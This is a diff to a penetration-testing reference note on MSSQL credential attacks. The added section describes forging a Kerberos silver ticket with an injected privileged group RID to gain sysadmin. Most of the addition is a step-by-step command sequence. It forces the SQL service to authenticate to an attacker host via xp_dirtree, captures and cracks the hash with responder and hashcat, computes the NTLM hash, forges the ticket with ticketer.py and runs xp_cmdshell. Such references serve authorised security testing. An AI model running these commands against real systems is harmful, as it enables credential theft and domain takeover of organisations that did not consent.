@@ -4,8 +4,8 @@ type: technique
 tags: [credentials, database, mssql, reference-import, windows]
 phase: post-exploitation
 date_created: 2026-05-13
-date_updated: 2026-07-02
-sources: [InternalAllTheThings]
+date_updated: 2026-07-14
+sources: [InternalAllTheThings, hacktricks-network]
 ---
 
 # MSSQL - Credentials
@@ -130,6 +130,38 @@ Execute the Agent job so that a process will be started in the context of the pr
 ## References
 
 * [Hijacking SQL Server Credentials using Agent Jobs for Domain Privilege Escalation  - Scott Sutherland - September 10, 2024](https://www.netspi.com/blog/technical-blog/network-pentesting/hijacking-sql-server-credentials-with-agent-jobs-for-domain-privilege-escalation/)
+
+## MSSQL coercion to silver ticket with PAC group injection
+
+When you can coerce the SQL service account NetNTLMv2 and crack it, forge a silver
+ticket for the MSSQLSvc SPN and inject a privileged group RID into the PAC so the
+impersonated user is granted sysadmin, without cracking any sysadmin password. The
+injected PAC group RID is what buys sysadmin at login, which distinguishes this from a
+plain silver ticket.
+
+```bash
+# 1. Coerce and crack the service account hash
+#    (in SQL)  EXEC master..xp_dirtree '\\<attacker_ip>\share'
+sudo responder -I tun0                 # capture NetNTLMv2
+hashcat -m 5600 sqlsvc.hash wordlist   # recover the plaintext
+
+# 2. Derive the service NTLM (MD4 of the UTF-16LE password)
+python3 -c 'import hashlib;print(hashlib.new("md4","<PASSWORD>".encode("utf-16le")).hexdigest())'
+```
+
+```sql
+-- 3. Get the domain SID; find a group RID that grants sysadmin
+--    (map RIDs with: nxc mssql <ip> --local-auth -u u -p p --rid-brute)
+SELECT SUSER_SID('DOMAIN\Domain Users');   -- RID = last 4 bytes little-endian
+```
+
+```bash
+# 4. Forge the ticket with the privileged group RID, then log in
+ticketer.py -nthash <SERVICE_NTLM> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
+  -spn MSSQLSvc/<fqdn>:1433 -groups <SYSADMIN_GROUP_RID> <user_to_impersonate>
+KRB5CCNAME=<user_to_impersonate>.ccache mssqlclient.py -no-pass -k <fqdn>
+# xp_cmdshell now runs as the SQL service account via the forged ticket
+```
 
 ## Bypasses and variants
 
